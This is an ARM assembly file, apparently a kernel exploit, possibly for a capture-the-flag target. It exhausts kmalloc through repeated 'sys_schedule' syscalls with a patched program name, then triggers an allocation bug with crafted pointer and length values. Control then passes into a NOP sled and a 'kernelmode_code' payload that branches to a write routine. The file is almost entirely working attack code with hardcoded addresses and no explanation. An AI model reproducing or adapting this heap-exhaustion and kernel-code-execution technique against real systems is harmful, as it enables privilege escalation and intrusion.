
@@ kernelmodecode:
@ ldr r3, [pc, #4] @ 0x30838
@ sub r3, #0x20000
@ mov r1, #0x20
@ mov r2, #0x200
@ blx r3 



@@@ initial fixup for exhaust to work

ldr r1, =0x448f5c8 @ progname
ldr r2, =0x03030303
str r2, [r1]


@@@ exhaust kmalloc

ldr r6, =0x80000 @ size
bl exhaust

ldr r6, =0x802 @ size
bl exhaust

ldr r6, =0x28 @ size
bl exhaust


@@@ trigger the bug

mov r0, #4 @ sys_schedule
ldr r1, =0x441144c @ progname
ldr r2, =0x440f5c8 @ codeptr
mov r3, #8 @ codelen -- allocation must succeed
svc #0

@@@ get $pc

foz: b foz


svc #0


kernelmode_code:

nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

ldr r2, =0x30998 @write
ldr r7, =0x20000
ldr r6, =0x4000200 @ end
sub r2, r7
mov r4, r6
sub r4, #0x200


bx r2

nop



exhaust:

mov r0, #4 @ sys_schedule
ldr r1, =0x448f5c8 @ progname
ldr r2, =0x440f5c8 @ codeptr
ldr r7, [r1]
add r7, #2
str r7, [r1]
mov r3, r6 @size
svc #0

nop
cmp r0, #0
bne done
b exhaust

done:
bx lr

nop
nop


